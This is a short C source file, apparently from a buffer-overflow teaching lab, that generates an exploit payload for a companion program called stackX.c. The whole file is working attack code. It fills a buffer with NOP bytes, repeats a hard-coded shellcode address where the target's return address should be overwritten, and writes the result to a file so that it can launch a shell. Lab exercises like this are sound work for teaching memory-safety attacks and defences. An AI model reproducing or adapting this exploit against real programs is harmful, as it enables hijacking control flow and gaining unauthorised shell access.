/* exploitX.c  */

/* A program that creates a file containing code for launching shell*/
/* in stackX.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define ShellCodeAddr	0x0804a02c

void main(int argc, char **argv)
{
    char buffer[40];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 40);

    /* load the address of shellcode to the return address */
    /* The offset from the buffer to the return address in the 
     * target program is 20. But just to be sure, repeat the 
     * target address several times. */

    *((long*)(buffer+8)) = ShellCodeAddr;
    *((long*)(buffer+12)) = ShellCodeAddr;
    *((long*)(buffer+16)) = ShellCodeAddr;
    *((long*)(buffer+20)) = ShellCodeAddr;
    *((long*)(buffer+24)) = ShellCodeAddr;

    /* Save the contents to the file "badshellcodefile" */
    badfile = fopen("./badshellcodefile", "w");
    fwrite(buffer, 40, 1, badfile);
    fclose(badfile);
}

